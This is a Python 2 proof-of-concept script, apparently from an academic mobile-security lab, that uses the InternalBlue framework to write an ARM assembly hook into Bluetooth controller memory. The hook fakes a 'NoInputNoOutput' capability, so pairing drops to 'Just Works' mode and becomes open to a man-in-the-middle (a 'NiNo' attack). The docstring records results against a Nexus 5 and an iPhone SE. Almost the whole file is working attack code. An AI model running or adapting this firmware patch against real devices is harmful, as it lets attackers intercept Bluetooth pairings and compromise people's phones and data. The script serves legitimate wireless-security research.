#!/usr/bin/python2

# Jiska Classen, Secure Mobile Networking Lab

import sys

from pwn import *
from internalblue import core



"""
In a NiNo attack an active MITM fakes that the other device has no in put and no output capabilities. We think smartphones should not accept that or show a big warning ("Is this really a headset without display?!"), but in implementations we saw this does not happen. With NiNo, secure simple pairing will still be present, but in "Just Works" mode which is suspect to MITM.

Our observations:
- Since we do not tell our own Nexus 5 that it does not have IO capabilities, it continues showing a simple pairing number, which is not displayed on other devices.
- Pairing with iPhone SE: It only asks for yes/no-confirmation, pairing successful.


Variables changed:
    io_capability:
        0x00 DisplayOnly
        0x01 DisplayYesNo
        0x02 KeyboardOnly
        0x03 NoInputNoOutput

    authentication_requirements:
        0x00 MITM Protection Not Required - No Bonding. Numeric comparison with automatic accept allowed.
        0x01 MITM Protection Required - No Bonding. Use IO Capabilities to determine authentication procedure
        0x02 MITM Protection Not Required - Dedicated Bonding. Numeric comparison with automatic accept allowed.
        0x03 MITM Protection Required - Dedicated Bonding. Use IO Capabilities to determine authentication procedure
        0x04 MITM Protection Not Required - General Bonding. Numeric Comparison with automatic accept allowed.
        0x05 MITM Protection Required - General Bonding. Use IO capabilities to determine authentication procedure.
        

TODO 
    This seems to work, but tends to be buggy depending on what information is cached in which smartphone.
    Probably not that good for a live demo, better do a screenshot here.

"""


HOOK_IO_CAP_RESP = 0x303D4 # we just change the complete simple pairing state machine
ASM_LOCATION_IO_CAP_RESP = 0x00211800 #0xd7800
ASM_SNIPPET_IO_CAP_RESP = """
        //restore original 8 bytes of instructions which we overwrite by patching a branch into it
        push {r4-r6, lr}
        mov  r4, r0
        
        //overwrite variables used by sp_sm_io_cap_req_reply__lmp_io_cap_req_res_30286
        //which actually executes:
        //   send_LMP_IO_Capability_req_301E4
        //   send_LMP_IO_Capability_res_30170
        
        push {r0-r1, lr}    //variables we need in our actual subroutine here        
        ldr  r1, =0x20387D  //io_caps__auth_req_20387D
        //oob and auth_req are already set to 0x00...
        ldrb r0, =0x03      //io_cap 0x03: NoInputNoOutput
        strb r0, [r1]
        pop  {r0-r1, lr}        

        
        //branch back into simple_pairing_state_machine_303D4 but without our branch
    locret: 
        b    0x303D8
""" 




internalblue = core.InternalBlue(log_level='info')

# setup sockets
if not internalblue.connect():
    log.critical("No connection to target device.")
    exit(-1)



progress_log = log.info("Writing ASM snippet for NiNo check.")
code = asm(ASM_SNIPPET_IO_CAP_RESP, vma=ASM_LOCATION_IO_CAP_RESP)
if not internalblue.writeMem(address=ASM_LOCATION_IO_CAP_RESP, data=code, progress_log=progress_log):
    progress_log.critical("error!")
    exit(-1)
    

# all send_lmp functions are in rom...
log.info("Installing NiNo hook ...")
patch = asm("b 0x%x" % ASM_LOCATION_IO_CAP_RESP, vma=HOOK_IO_CAP_RESP)
if not internalblue.patchRom(HOOK_IO_CAP_RESP, patch):
    log.critical("error!")
    exit(-1)



# shutdown connection
internalblue.shutdown()
log.info("Goodbye")


